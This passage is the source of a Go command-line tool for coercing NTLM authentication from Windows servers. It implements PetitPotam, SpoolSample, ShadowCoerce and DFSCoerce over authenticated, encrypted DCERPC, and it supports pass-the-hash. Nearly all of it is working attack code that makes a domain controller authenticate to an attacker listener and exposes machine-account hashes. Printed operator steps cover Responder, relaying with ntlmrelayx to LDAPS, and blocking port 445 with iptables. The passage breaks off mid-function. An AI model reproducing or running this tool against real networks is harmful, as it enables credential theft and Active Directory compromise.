package main

/*
PetitPotam PoC with DCERPC PKT_PRIVACY (Authentication Level 6)

This implementation demonstrates NTLM coercion via MS-EFSRPC with full DCERPC encryption and signing.
The attack triggers a Windows DC to authenticate to an attacker-controlled listener, exposing the
machine account NTLMv2 hash.

CRITICAL SUCCESS FACTORS:
1. Type 1 (Negotiate) MUST include NTLMSSP_NEGOTIATE_TARGET_INFO (0x00800000)
2. Type 1 MUST include NTLMSSP_NEGOTIATE_EXTENDED_SESSIONSECURITY (0x00080000)
3. Use lsarpc pipe (not efsrpc) with UUID c681d488-d850-11d0-8c52-00c04fd90f7e
4. NTLMv2 identity: uppercase(username) + domain (domain NOT uppercased)
5. RC4 cipher must be continuous stream (never reset between requests)
6. Encryption order: encrypt stub FIRST, then sign (signature encrypts checksum)

Technical Implementation:
- SMB connection to \\target\IPC$
- Named pipe: \pipe\lsarpc
- DCERPC 3-way handshake: Bind → BindAck → Auth3
- Encrypted MS-EFSRPC call with UNC path to listener
- Server attempts UNC access, triggering NTLM auth to listener

References
References:
- MS-EFSR: Encrypting File System Remote Protocol
- MS-RPCE: RPC Protocol Extensions
- MS-NLMP: NTLM Authentication Protocol
*/

import (
	"bufio"
	"bytes"
	"crypto/hmac"
	"crypto/md5"
	"crypto/rand"
	"crypto/rc4"
	"encoding/binary"
	"encoding/hex"
	"fmt"
	"net/url"
	"os"
	"strings"
	"syscall"
	"time"
	"unicode/utf16"

	"github.com/jfjallid/go-smb/smb"
	"github.com/jfjallid/go-smb/spnego"
	"github.com/mjwhitta/cli"
	"golang.org/x/crypto/md4"
	"golang.org/x/net/proxy"
	"golang.org/x/term"
)

const (
	// NDR (Network Data Representation) transfer syntax UUID
	// This is the same for all DCERPC interfaces
	ndrUUID = "8a885d04-1ceb-11c9-9fe8-08002b104860"

	// DCERPC packet types (MS-RPCE section 2.2.1.1)
	dcerpcBind    = 11 // Client → Server: Request interface binding
	dcerpcBindAck = 12 // Server → Client: Acknowledge binding
	dcerpcAuth3   = 16 // Client → Server: Complete 3-way auth (no response expected)
	dcerpcRequest = 0  // Client → Server: RPC function call
	dcerpcFault   = 3  // Server → Client: Error response

	// DCERPC packet flags
	dcerpcPfcFirstFrag = 0x01 // First fragment of multi-fragment PDU
	dcerpcPfcLastFrag  = 0x02 // Last fragment of multi-fragment PDU

	// DCERPC authentication
	dcerpcAuthTypeNTLMSSP  = 10 // NTLMSSP authentication
	dcerpcAuthLevelPrivacy = 6  // PKT_PRIVACY: sign + seal (encrypt)

	// SMB2 IOCTL for named pipe operations
	//fsctlPipeTransceive = 0x0011C017
)

// Global flags
var verbose bool
var fireAll bool
var useHTTP bool

// NTLMAuth holds NTLM authentication state for DCERPC PKT_PRIVACY
// This struct maintains the cryptographic state across multiple DCERPC requests.
//
// CRITICAL: The clientSealHandle RC4 cipher is a CONTINUOUS STREAM and must NEVER be reset.
// Each encryption operation (stub, then checksum in signature) uses the continued RC4 stream.
// Resetting the cipher between operations will cause decryption failures on the server.
type NTLMAuth struct {
	user           string // Username for authentication
	password       string // Password for NT hash calculation
	hash           []byte // Pre-computed NT hash (16 bytes) - if provided, password is ignored
	domain         string // Domain name (NOT uppercased in Type 3 message)
	challenge      []byte // 8-byte server challenge from Type 2 (Challenge) message
	flags          uint32 // Negotiated NTLM flags from server's Challenge message
	sessionBaseKey []byte // 16-byte session base key derived from NTLMv2 response
	clientSignKey  []byte // 16-byte signing key: MD5(sessionBaseKey + client signing magic)
	clientSealKey  []byte // 16-byte sealing key: MD5(sessionBaseKey + client sealing magic)
	serverSignKey  []byte // 16-byte server signing key for verifying responses
	serverSealKey  []byte // 16-byte server sealing key for decrypting responses
	seqNum         uint32 // Sequence number for DCERPC requests (starts at 0)
	authContextID  uint32 // Auth context ID assigned by server in BindAck
	negotiateMsg   []byte // Complete Type 1 message (saved for MIC calculation)
	challengeMsg   []byte // Complete Type 2 message (saved for MIC calculation)
	listenerIP     string // Listener IP address for constructing TARGET_NAME AV_PAIR

	// CRITICAL: RC4 cipher handle for encryption - MUST be continuous stream
	// Never call rc4.NewCipher() again after initialization - reuse this handle
	// The RC4 stream state persists across all encryption operations:
	//   1. Stub encryption
	//   2. Signature checksum encryption (in same request)
	//   3. Next request's stub encryption
	//   4. Next request's checksum encryption
	//   ... and so on
	clientSealHandle *rc4.Cipher
	serverSealHandle *rc4.Cipher // RC4 cipher for decrypting server responses
}

// CoercionMethod defines a DCERPC coercion technique (PetitPotam, SpoolSample, etc.)
type CoercionMethod struct {
	Name         string   // Display name (e.g., "PetitPotam", "SpoolSample")
	PipeName     string   // Named pipe to use (e.g., "lsarpc", "spoolss")
	UUID         string   // DCERPC interface UUID
	MajorVersion uint16   // Interface major version
	MinorVersion uint16   // Interface minor version
	Opnums       []uint16 // Operation numbers to try (in order)

	// CreateStub builds the NDR-encoded stub for the RPC call
	// Parameters: listenerIP (where to coerce auth), opnum (which operation)
	CreateStub func(listenerIP string, opnum uint16) []byte
}

func main() {
	var (
		target   string
		listener string
		username string
		password string
		hash     string
		domain   string
		method   string
		pipe     string
		proxyURL string
		opnum    int
	)

	// Configure CLI
	cli.Align = true
	cli.Banner = "goercer [OPTIONS]"
	cli.Info("Coerces Windows servers to authenticate to an attacker-controlled listener")
	cli.Info("Universal: --pipe efsrpc works on all Windows (10/11, Server 2016-2025) as of 12/13/25")
	cli.Authors = []string{"ineffectivecoder"}

	// Define flags
	cli.Flag(&target, "t", "target", "", "Target server IP address")
	cli.Flag(&listener, "l", "listener", "", "Listener IP for callback. For HTTP: use IP@PORT/path (e.g., 10.1.1.99@80/test)")
	cli.Flag(&username, "u", "user", "", "Domain username")
	cli.Flag(&domain, "d", "domain", "", "Domain name")
	cli.Flag(&password, "p", "password", "", "Password (prompted if not provided)")
	cli.Flag(&hash, "H", "hash", "", "NTLM hash (32 hex characters)")
	cli.Flag(&method, "m", "method", "petitpotam", "Coercion method: petitpotam, spoolsample, shadowcoerce, dfscoerce")
	cli.Flag(&pipe, "pipe", "efsrpc", "Named pipe (petitpotam only): efsrpc (universal - 1 callback on Win11/2025, 3 on Win10/2022), lsarpc (legacy), samr, netlogon, lsass")
	cli.Flag(&opnum, "opnum", -1, "Test specific opnum only. Default: try all. PetitPotam: 0, 4, 5, 6, 7, 12. SpoolSample: 62, 65")
	cli.Flag(&proxyURL, "proxy", "", "SOCKS5 proxy URL (e.g., socks5://127.0.0.1:1080)")
	cli.Flag(&verbose, "v", "verbose", false, "Enable verbose/debug output")
	cli.Flag(&fireAll, "a", "all", false, "Fire all opnums and path variations (default: stop after first success)")
	cli.Flag(&useHTTP, "http", false, "Use HTTP URL for coercion instead of UNC path (for HTTP relay attacks like ESC8)")

	cli.Parse()

	// Validate required flags
	if target == "" || listener == "" || username == "" || domain == "" {
		fmt.Println("[!] Error: Missing required flags")
		fmt.Println("[!] Required: -t (target), -l (listener), -u (user), -d (domain)")
		cli.Usage(1)
	}

	// Validate IP addresses
	if !isValidIP(target) {
		fmt.Printf("[!] Error: Invalid target IP address: %s\n", target)
		os.Exit(1)
	}
	// For HTTP mode, allow IP:port format; for UNC mode, require strict IP
	if useHTTP {
		// HTTP mode: automatically construct WebDAV path if not provided
		if listener == "" {
			fmt.Println("[!] Error: Listener required for HTTP mode")
			os.Exit(1)
		}

		// Auto-construct WebDAV format: IP@80/test (unless user provided full format)
		if !strings.Contains(listener, "@") {
			// Just an IP - construct full WebDAV path automatically
			listener = listener + "@80/test"
			fmt.Printf("[+] HTTP/WebDAV mode: Auto-constructed listener path: %s\n", listener)
		} else {
			fmt.Printf("[+] HTTP/WebDAV mode: Using provided listener: %s\n", listener)
		}

		fmt.Printf("[+] Example path that will be sent: \\\\%s\\test\\Settings.ini\n", listener)
		fmt.Println("[!] IMPORTANT: WebClient service must be running on target")
		fmt.Println("[!]   - Check: sc query webclient")
		fmt.Println("[!]   - Start: sc start webclient")
		fmt.Println("[!]")
		fmt.Println("[!] Listener setup (choose one):")
		fmt.Println("[!]   - Responder: sudo responder -I eth0 -wv")
		fmt.Println("[!]   - ntlmrelayx: sudo ntlmrelayx.py -t ldaps://dc.domain.com --http-port 80")
		fmt.Println("[!]")
		fmt.Println("[!] CRITICAL: Ensure SMB (port 445) is BLOCKED on your listener!")
		fmt.Println("[!]   - Windows tries SMB first, only uses HTTP if SMB fails")
		fmt.Println("[!]   - Run: sudo iptables -A INPUT -p tcp --dport 445 -j DROP")
		fmt.Println("[!]")
		fmt.Println("[!] NOTE: SpoolSample (-m spoolsample) often works better for HTTP coercion")
		fmt.Println("[!]       PetitPotam may not reliably trigger WebClient on all Windows versions")
	} else {
		if !isValidIP(listener) {
			fmt.Printf("[!] Error: Invalid listener IP address: %s\n", listener)
			os.Exit(1)
		}
	}

	// Validate method (case-insensitive)
	method = strings.ToLower(method)
	validMethods := []string{"petitpotam", "spoolsample", "shadowcoerce", "dfscoerce"}
	methodValid := false
	for _, vm := range validMethods {
		if method == vm {
			methodValid = true
			break
		}
	}
	if !methodValid {
		fmt.Printf("[!] Error: Invalid method '%s'\n", method)
		fmt.Println("[!] Valid methods: petitpotam, spoolsample, shadowcoerce, dfscoerce")
		os.Exit(1)
	}

	// Validate pipe name (case-insensitive) and map to actual Windows pipe names
	pipe = strings.ToLower(pipe)
	validPipes := []string{"lsarpc", "efsr", "efsrpc", "samr", "netlogon", "lsass"}
	pipeValid := false
	for _, vp := range validPipes {
		if pipe == vp {
			pipeValid = true
			break
		}
	}
	if !pipeValid {
		fmt.Printf("[!] Error: Invalid pipe name '%s'\n", pipe)
		fmt.Println("[!] Valid pipes: efsrpc (Win11), lsarpc, efsr, samr, netlogon, lsass")
		os.Exit(1)
	}

	// Map short pipe names to actual Windows pipe names
	pipeMap := map[string]string{
		"lsarpc":   "lsarpc",
		"efsr":     "efsrpc", // Short name maps to full pipe name
		"efsrpc":   "efsrpc",
		"samr":     "samr",
		"netlogon": "netlogon",
		"lsass":    "lsass",
	}
	pipe = pipeMap[pipe]

	// Warn if pipe is specified but method doesn't use it
	if pipe != "lsarpc" && method != "petitpotam" {
		fmt.Printf("[!] Warning: --pipe parameter only applies to 'petitpotam' method (ignored for %s)\n", method)
	}

	// Validate opnum if specified
	if opnum >= 0 {
		validOpnums := map[string][]int{
			"petitpotam":   {0, 4, 5, 6, 7, 12},
			"spoolsample":  {62, 65},
			"shadowcoerce": {}, // opnum not supported
			"dfscoerce":    {}, // opnum not supported
		}

		methodOpnums, methodSupported := validOpnums[method]
		if !methodSupported || len(methodOpnums) == 0 {
			fmt.Printf("[!] Error: --opnum parameter is not supported for method '%s'\n", method)
			fmt.Println("[!] --opnum only works with: petitpotam, spoolsample")
			os.Exit(1)
		}

		// Check if opnum is valid for this method
		validForMethod := false
		for _, validOp := range methodOpnums {
			if opnum == validOp {
				validForMethod = true
				break
			}
		}

		if !validForMethod {
			fmt.Printf("[!] Error: Invalid opnum %d for method '%s'\n", opnum, method)
			if method == "petitpotam" {
				fmt.Println("[!] Valid opnums for PetitPotam: 0, 4, 5, 6, 7, 12")
			} else if method == "spoolsample" {
				fmt.Println("[!] Valid opnums for SpoolSample: 62, 65")
			}
			os.Exit(1)
		}
	}

	// Validate proxy URL format if provided
	if proxyURL != "" {
		if !strings.HasPrefix(proxyURL, "socks5://") {
			fmt.Println("[!] Error: Proxy URL must start with 'socks5://'")
			fmt.Println("[!] Example: socks5://127.0.0.1:1080")
			os.Exit(1)
		}
		// Validate the host:port part
		proxyHost := strings.TrimPrefix(proxyURL, "socks5://")
		if !strings.Contains(proxyHost, ":") {
			fmt.Println("[!] Error: Proxy URL must include port (e.g., socks5://127.0.0.1:1080)")
			os.Exit(1)
		}
	}

	// Handle authentication - prompt if neither password nor hash provided
	if password == "" && hash == "" {
		fmt.Print("Enter password or NTLM hash: ")

		// Try to read password without echo
		if term.IsTerminal(int(syscall.Stdin)) {
			bytePassword, err := term.ReadPassword(int(syscall.Stdin))
			fmt.Println() // newline after password input
			if err != nil {
				fmt.Printf("[!] Failed to read password: %v\n", err)
				os.Exit(1)
			}
			password = string(bytePassword)
		} else {
			// Fallback to buffered read if not a terminal
			reader := bufio.NewReader(os.Stdin)
			input, err := reader.ReadString('\n')
			if err != nil {
				fmt.Printf("[!] Failed to read input: %v\n", err)
				os.Exit(1)
			}
			password = strings.TrimSpace(input)
		}

		// Check if input is an NTLM hash
		if isNTLMHash(password) {
			hash = password
			password = ""
		}
	}

	// Validate that we have either password or hash
	if password == "" && hash == "" {
		fmt.Println("[!] Error: Must provide either password (-p) or NTLM hash (-H)")
		os.Exit(1)
	}

	// Validate hash format if provided
	if hash != "" && !isNTLMHash(hash) {
		fmt.Printf("[!] Error: Invalid NTLM hash format: '%s'\n", hash)
		fmt.Println("[!] Hash must be exactly 32 hexadecimal characters")
		fmt.Println("[!] Example: 8846f7eaee8fb117ad06bdd830b7586c")
		os.Exit(1)
	}

	// SMB connection setup
	options := smb.Options{
		Host: target,
		Port: 445,
	}

	// Setup SOCKS5 proxy if specified
	if proxyURL != "" {
		fmt.Printf("[+] Using SOCKS5 proxy: %s\n", proxyURL)
		proxyHost := strings.TrimPrefix(proxyURL, "socks5://")
		dialer, err := proxy.FromURL(&url.URL{Scheme: "socks5", Host: proxyHost}, proxy.Direct)
		if err != nil {
			fmt.Printf("[!] Failed to create proxy dialer: %v\n", err)
			os.Exit(1)
		}
		options.ProxyDialer = dialer
	}

	// Setup authentication - use hash if provided, otherwise password
	if hash != "" {
		fmt.Printf("[+] Using NTLM hash (pass-the-hash)\n")
		hashBytes, err := hex.DecodeString(hash)
		if err != nil {
			fmt.Printf("[!] Invalid NTLM hash format\n")
			os.Exit(1)
		}
		options.Initiator = &spnego.NTLMInitiator{
			User:   username,
			Hash:   hashBytes,
			Domain: domain,
		}
	} else {
		// Use password authentication
		options.Initiator = &spnego.NTLMInitiator{
			User:     username,
			Password: password,
			Domain:   domain,
		}
	}

	session, err := smb.NewConnection(options)
	if err != nil {
		fmt.Printf("Connection failed: %v\n", err)
		os.Exit(1)
	}
	defer session.Close()

	fmt.Println("[+] SMB authenticated")

	share := "IPC$"
	err = session.TreeConnect(share)
	if err != nil {
		fmt.Printf("TreeConnect failed: %v\n", err)
		os.Exit(1)
	}
	defer session.TreeDisconnect(share)

	// Initialize NTLM auth state (reusable across methods)
	var hashBytes []byte
	if hash != "" {
		hashBytes, _ = hex.DecodeString(hash)
	}

	auth := &NTLMAuth{
		user:       username,
		password:   password,  // Will be empty if using hash
		hash:       hashBytes, // Will be nil if using password
		domain:     domain,
		listenerIP: listener,
		seqNum:     0,
	}

	// Execute chosen coercion method
	switch method {
	case "petitpotam":
		err = executePetitPotam(session, share, auth, listener, pipe, opnum, fireAll)
	case "spoolsample":
		if pipe != "lsarpc" {
			fmt.Println("[!] Note: Custom pipe parameter ignored for SpoolSample (only works on \\pipe\\spoolss)")
		}
		err = executeSpoolSample(session, share, auth, listener, target, opnum)
	case "shadowcoerce":
		if pipe != "lsarpc" {
			fmt.Println("[!] Note: Custom pipe parameter ignored for ShadowCoerce (only works on \\pipe\\FssagentRpc)")
		}
		err = executeShadowCoerce(session, share, auth, listener)
	case "dfscoerce":
		if pipe != "lsarpc" {
			fmt.Println("[!] Note: Custom pipe parameter ignored for DFSCoerce (only works on \\pipe\\netdfs)")
		}
		err = executeDFSCoerce(session, share, auth, listener)
	// Future coercion methods can be added here:
	// case "printerbug":
	//     err = executePrinterBug(session, share, auth, listener)
	default:
		fmt.Printf("[!] Unknown method: %s\n", method)
		fmt.Println("[!] Valid methods: petitpotam, spoolsample, shadowcoerce, dfscoerce")
		os.Exit(1)
	}

	if err != nil {
		fmt.Printf("[+] Got error: %v\n", err)
	}

	fmt.Println("[+] Check Responder for callback!")
}

// executePetitPotam implements the PetitPotam coercion technique (MS-EFSRPC)
// This is the VERIFIED WORKING implementation - do not modify without extensive testing
//
// PetitPotam tries multiple MS-EFSRPC opnums to maximize success rate:
// - Opnum 0:  EfsRpcOpenFileRaw (often patched but still attempted)
// - Opnum 4:  EfsRpcEncryptFileSrv (reliable fallback)
// - Opnum 5:  EfsRpcDecryptFileSrv (alternative method)
// - Opnum 6:  EfsRpcQueryUsersOnFile (info query coercion)
// - Opnum 7:  EfsRpcQueryRecoveryAgents (recovery agent coercion)
// - Opnum 12: EfsRpcFileKeyInfo (key info coercion)
//
// Each opnum triggers the server to authenticate to the UNC path in the FileName parameter.
// The attack succeeds even if some opnums are patched, as long as one works.
//
// Parameters:
//   - specificOpnum: If >= 0, only test this opnum. If -1, test all opnums
//   - fireAll: If true, try all opnums and path variations. If false, stop after first success.
func executePetitPotam(session *smb.Connection, share string, auth *NTLMAuth, listenerIP string, pipeName string, specificOpnum int, fireAll bool) error {
	fmt.Printf("[*] Using PetitPotam coercion technique via \\pipe\\%s\n", pipeName)

	// Select the correct UUID based on the pipe being used
	// Different pipes expose MS-EFSR on different interface UUIDs
	var uuid string
	switch pipeName {
	case "efsrpc":
		// Native EFSR interface UUID (MS-EFSR)
		uuid = "df1941c5-fe89-4e79-bf10-463657acf44d"
	default:
		// For lsarpc, samr, netlogon, lsass - use alternate UUID
		uuid = "c681d488-d850-11d0-8c52-00c04fd90f7e"
	}

	// Define PetitPotam method parameters
	// Try all known MS-EFSRPC opnums that can trigger coercion
	var opnums []uint16
	if specificOpnum >= 0 {
		// Test only the specified opnum
		opnums = []uint16{uint16(specificOpnum)}
		fmt.Printf("[*] Testing ONLY opnum %d\n", specificOpnum)
	} else {
		// Test all opnums
		opnums = []uint16{
			0,  // EfsRpcOpenFileRaw - Works on Win11 with efsrpc pipe
			4,  // EfsRpcEncryptFileSrv
			5,  // EfsRpcDecryptFileSrv
			6,  // EfsRpcQueryUsersOnFile
			7,  // EfsRpcQueryRecoveryAgents
			12, // EfsRpcFileKeyInfo
		}
	}

	method := CoercionMethod{
		Name:         "PetitPotam",
		PipeName:     pipeName,
		UUID:         uuid,
		MajorVersion: 1,
		MinorVersion: 0,
		Opnums:       opnums,
		CreateStub:   createEfsRpcStub,
	}

	// Open named pipe with read+write access
	opts := smb.NewCreateReqOpts()
	opts.DesiredAccess = smb.FAccMaskFileReadData | smb.FAccMaskFileWriteData |
		smb.FAccMaskFileReadEA | smb.FAccMaskFileReadAttributes |
		smb.FAccMaskReadControl | smb.FAccMaskSynchronize

	pipe, err := session.OpenFileExt(share, method.PipeName, opts)
	if err != nil {
		return fmt.Errorf("failed to open pipe %s: %v", method.PipeName, err)
	}
	defer pipe.CloseFile()

	fmt.Printf("[+] Pipe %s opened, starting DCERPC auth...\n", method.PipeName)

	// Perform authenticated DCERPC bind (3-way handshake)
	err = performAuthenticatedBind(&pipe, session, share, method.PipeName, method.UUID, method.MajorVersion, method.MinorVersion, auth)
	if err != nil {
		return fmt.Errorf("DCERPC auth bind failed: %v", err)
	}

	fmt.Println("[+] DCERPC authentication complete!")

	// CRITICAL: Try ALL opnums, don't stop early
	// Original working code ALWAYS tried opnum 4 regardless of opnum 0 result
	// One opnum may be patched while another works

	// Map opnums to function names for clear output
	opnumNames := map[uint16]string{
		0:  "EfsRpcOpenFileRaw",
		4:  "EfsRpcEncryptFileSrv",
		5:  "EfsRpcDecryptFileSrv",
		6:  "EfsRpcQueryUsersOnFile",
		7:  "EfsRpcQueryRecoveryAgents",
		12: "EfsRpcFileKeyInfo",
	}

	// Try multiple path variations like Coercer does to maximize success rate
	// Different Windows versions respond to different path formats
	pathVariations := buildCallbackPaths(listenerIP, useHTTP)

	var lastErr error
	successfulOpnum := -1
opnumLoop:
	for _, opnum := range method.Opnums {
		funcName := opnumNames[opnum]
		if funcName == "" {
			funcName = "Unknown"
		}
		fmt.Printf("[-] Trying %s opnum %d (%s)...\n", method.Name, opnum, funcName)

		// Try all path variations for this opnum
		for pathIdx, testPath := range pathVariations {
			pathDisplay := strings.TrimRight(testPath, "\x00")
			if useHTTP {
				// Always show HTTP paths being attempted (not just in verbose mode)
				fmt.Printf("[*] Attempting HTTP path %d/%d: %s\n", pathIdx+1, len(pathVariations), pathDisplay)
				// Verify it has forward slashes for HTTP
				if !strings.Contains(pathDisplay, "/") && strings.Contains(pathDisplay, "@") {
					fmt.Printf("[!] WARNING: HTTP path missing forward slash! Should be @80/path not @80\\path\n")
				}
			} else if verbose {
				fmt.Printf("[DEBUG] Path variation %d/%d: %s\n", pathIdx+1, len(pathVariations), pathDisplay)
			}

			stub := createEfsRpcStub(testPath, uint16(opnum))
			err = sendAuthenticatedRequest(pipe, auth, opnum, stub)

			if err != nil {
				if err.Error() == "got fault 0x5" {
					if verbose {
						fmt.Printf("[-] Path variation %d: ACCESS_DENIED\n", pathIdx+1)
					}
				} else if err.Error() == "got ERROR_BAD_NETPATH (0x6f7) - attack likely worked" {
					pathDisplay := strings.TrimRight(testPath, "\x00")
					fmt.Printf("[+] Opnum %d (%s) path variation %d (%s) got ERROR_BAD_NETPATH - coercion successful!\n", opnum, funcName, pathIdx+1, pathDisplay)
					successfulOpnum = int(opnum)
					if !fireAll {
						break opnumLoop // Early exit - we got a callback
					}
					break // Move to next opnum in fireAll mode
				}
				lastErr = err
			} else {
				pathDisplay := strings.TrimRight(testPath, "\x00")
				// Opnum 0 (EfsRpcOpenFileRaw) often returns success when patched
				if opnum == 0 {
					if verbose {
						fmt.Printf("[!] Opnum 0 path variation %d (%s) returned success (may be patched)\n", pathIdx+1, pathDisplay)
					}
					// Don't count opnum 0 "success" as actual success - keep trying
				} else {
					fmt.Printf("[+] Opnum %d (%s) path variation %d (%s) completed successfully\n", opnum, funcName, pathIdx+1, pathDisplay)
					successfulOpnum = int(opnum)
					if !fireAll {
						break opnumLoop // Early exit - we got a callback
					}
					break // Move to next opnum in fireAll mode
				}
			}
		}
	}

	if successfulOpnum >= 0 {
		fmt.Printf("[+] Coercion triggered via opnum %d\n", successfulOpnum)
	}

	return lastErr
}

// executeSpoolSample implements the SpoolSample/PrinterBug coercion technique (MS-RPRN)
// This uses the Print Spooler service to coerce authentication
func executeSpoolSample(session *smb.Connection, share string, auth *NTLMAuth, listenerIP string, targetIP string, specificOpnum int) error {
	fmt.Printf("[*] Using SpoolSample coercion technique via \\pipe\\spoolss\n")

	// Define SpoolSample method parameters
	var opnums []uint16
	if specificOpnum >= 0 {
		// Test only specified opnum
		fmt.Printf("[*] Testing ONLY opnum %d\n", specificOpnum)
		opnums = []uint16{uint16(specificOpnum)}
	} else {
		// Test all opnums (default: 65 and 62)
		opnums = []uint16{65, 62} // RpcRemoteFindFirstPrinterChangeNotificationEx (65), RpcRemoteFindFirstPrinterChangeNotification (62)
	}

	method := CoercionMethod{
		Name:         "SpoolSample",
		PipeName:     "spoolss",
		UUID:         "12345678-1234-abcd-ef00-0123456789ab",
		MajorVersion: 1,
		MinorVersion: 0,
		Opnums:       opnums,
		CreateStub:   nil, // Will use custom logic below
	}

	// Open named pipe with read+write access
	opts := smb.NewCreateReqOpts()
	opts.DesiredAccess = smb.FAccMaskFileReadData | smb.FAccMaskFileWriteData |
		smb.FAccMaskFileReadEA | smb.FAccMaskFileReadAttributes |
		smb.FAccMaskReadControl | smb.FAccMaskSynchronize

	pipe, err := session.OpenFileExt(share, method.PipeName, opts)
	if err != nil {
		return fmt.Errorf("failed to open pipe %s: %v", method.PipeName, err)
	}
	defer pipe.CloseFile()

	fmt.Printf("[+] Pipe %s opened, starting DCERPC auth...\n", method.PipeName)

	// Perform authenticated DCERPC bind (3-way handshake)
	err = performAuthenticatedBind(&pipe, session, share, method.PipeName, method.UUID, method.MajorVersion, method.MinorVersion, auth)
	if err != nil {
		return fmt.Errorf("DCERPC auth bind failed: %v", err)
	}

	fmt.Println("[+] DCERPC authentication complete!")

	// Step 1: Open printer handle (opnum 1: RpcOpenPrinter)
	fmt.Printf("[-] Opening printer handle on \\\\%s...\n", targetIP)
	printerName := "\\\\" + targetIP + "\x00"
	printerStub := createRpcOpenPrinterStub(printerName)

	resp, err := sendAuthenticatedRequestWithResponse(pipe, auth, 1, printerStub)
	if err != nil {
		return fmt.Errorf("RpcOpenPrinter failed: %v", err)
	}

	// Parse response to extract printer handle (20 bytes at offset 24 in DCERPC response)
	// DCERPC Response header is 24 bytes, then comes the stub data
	var printerHandle []byte
	if len(resp) >= 24+20 {
		printerHandle = resp[24 : 24+20]
		fmt.Printf("[+] Printer handle opened: %x\n", printerHandle)
	} else {
		return fmt.Errorf("RpcOpenPrinter response too short: %d bytes", len(resp))
	}

	// Step 2: Try notification functions with listener UNC path
	var lastErr error
	successfulOpnum := -1
	for _, opnum := range method.Opnums {
		fmt.Printf("[-] Trying %s opnum %d...\n", method.Name, opnum)

		var stub []byte
		if opnum == 65 {
			stub = createRpcRemoteFindFirstPrinterChangeNotificationExStub(listenerIP, printerHandle)
		} else if opnum == 62 {
			stub = createRpcRemoteFindFirstPrinterChangeNotificationStub(listenerIP, printerHandle)
		} else {
			continue
		}

		// Show the callback path being used
		callbackPath := buildCallbackPath(listenerIP, useHTTP, "", "")
		pathDisplay := strings.TrimRight(callbackPath, "\x00")
		if useHTTP {
			fmt.Printf("[*] HTTP callback path: %s\n", pathDisplay)
			// Verify format
			if !strings.Contains(pathDisplay, "/") && strings.Contains(pathDisplay, "@") {
				fmt.Printf("[!] WARNING: HTTP path missing forward slash! Has: '%s'\n", pathDisplay)
			}
		} else {
			fmt.Printf("[*] SMB callback path: %s\n", pathDisplay)
		}

		err = sendAuthenticatedRequest(pipe, auth, opnum, stub)

		if err != nil {
			if err.Error() == "got fault 0x5" {
				fmt.Printf("[-] Opnum %d returned ACCESS_DENIED (probably patched)\n", opnum)
			} else if err.Error() == "got ERROR_BAD_NETPATH (0x6f7) - attack likely worked" {
				fmt.Printf("[+] Opnum %d got ERROR_BAD_NETPATH - coercion successful!\n", opnum)
				successfulOpnum = int(opnum)
			}
			lastErr = err
		} else {
			fmt.Printf("[+] Opnum %d completed successfully\n", opnum)
			successfulOpnum = int(opnum)
			lastErr = nil
		}
	}

	if successfulOpnum >= 0 {
		fmt.Printf("[+] Coercion triggered via opnum %d\n", successfulOpnum)
	}

	return lastErr
}

// executeShadowCoerce implements the ShadowCoerce coercion technique (MS-FSRVP)
func executeShadowCoerce(session *smb.Connection, share string, auth *NTLMAuth, listenerIP string) error {
	fmt.Printf("[*] Using ShadowCoerce coercion technique via \\pipe\\FssagentRpc\n")

	// Define ShadowCoerce method parameters
	method := CoercionMethod{
		Name:         "ShadowCoerce",
		PipeName:     "FssagentRpc",
		UUID:         "a8e0653c-2744-4389-a61d-7373df8b2292",
		MajorVersion: 1,
		MinorVersion: 0,
		Opnums:       []uint16{8, 9}, // IsPathSupported (8), IsPathShadowed (9)
		CreateStub:   createShadowCoerceStub,
	}

	// Open named pipe with read+write access
	opts := smb.NewCreateReqOpts()
	opts.DesiredAccess = smb.FAccMaskFileReadData | smb.FAccMaskFileWriteData |
		smb.FAccMaskFileReadEA | smb.FAccMaskFileReadAttributes |
		smb.FAccMaskReadControl | smb.FAccMaskSynchronize

	pipe, err := session.OpenFileExt(share, method.PipeName, opts)
	if err != nil {
		return fmt.Errorf("failed to open pipe %s: %v", method.PipeName, err)
	}
	defer pipe.CloseFile()

	fmt.Printf("[+] Pipe %s opened, starting DCERPC auth...\n", method.PipeName)

	// Perform authenticated DCERPC bind (3-way handshake)
	err = performAuthenticatedBind(&pipe, session, share, method.PipeName, method.UUID, method.MajorVersion, method.MinorVersion, auth)
	if err != nil {
		return fmt.Errorf("DCERPC auth bind failed: %v", err)
	}

	fmt.Println("[+] DCERPC authentication complete!")

	// Try all opnums
	var lastErr error
	successfulOpnum := -1
	for _, opnum := range method.Opnums {
		fmt.Printf("[-] Trying %s opnum %d...\n", method.Name, opnum)

		stub := method.CreateStub(listenerIP, opnum)
		err = sendAuthenticatedRequest(pipe, auth, opnum, stub)

		if err != nil {
			if err.Error() == "got fault 0x5" {
				fmt.Printf("[-] Opnum %d returned ACCESS_DENIED (probably patched)\n", opnum)
			} else if err.Error() == "got ERROR_BAD_NETPATH (0x6f7) - attack likely worked" {
				fmt.Printf("[+] Opnum %d got ERROR_BAD_NETPATH - coercion successful!\n", opnum)
				successfulOpnum = int(opnum)
			}
			lastErr = err
		} else {
			fmt.Printf("[+] Opnum %d completed successfully\n", opnum)
			successfulOpnum = int(opnum)
			lastErr = nil
		}
	}

	if successfulOpnum >= 0 {
		fmt.Printf("[+] Coercion triggered via opnum %d\n", successfulOpnum)
	}

	return lastErr
}

// executeDFSCoerce implements the DFSCoerce coercion technique (MS-DFSNM)
func executeDFSCoerce(session *smb.Connection, share string, auth *NTLMAuth, listenerIP string) error {
	fmt.Printf("[*] Using DFSCoerce coercion technique via \\pipe\\netdfs\n")

	// Define DFSCoerce method parameters
	method := CoercionMethod{
		Name:         "DFSCoerce",
		PipeName:     "netdfs",
		UUID:         "4fc742e0-4a10-11cf-8273-00aa004ae673",
		MajorVersion: 3,
		MinorVersion: 0,
		Opnums:       []uint16{12, 13}, // NetrDfsAddStdRoot (12), NetrDfsRemoveStdRoot (13)
		CreateStub:   createDFSCoerceStub,
	}

	// Open named pipe with read+write access
	opts := smb.NewCreateReqOpts()
	opts.DesiredAccess = smb.FAccMaskFileReadData | smb.FAccMaskFileWriteData |
		smb.FAccMaskFileReadEA | smb.FAccMaskFileReadAttributes |
		smb.FAccMaskReadControl | smb.FAccMaskSynchronize

	pipe, err := session.OpenFileExt(share, method.PipeName, opts)
	if err != nil {
		return fmt.Errorf("failed to open pipe %s: %v", method.PipeName, err)
	}
	defer pipe.CloseFile()

	fmt.Printf("[+] Pipe %s opened, starting DCERPC auth...\n", method.PipeName)

	// Perform authenticated DCERPC bind (3-way handshake)
	err = performAuthenticatedBind(&pipe, session, share, method.PipeName, method.UUID, method.MajorVersion, method.MinorVersion, auth)
	if err != nil {
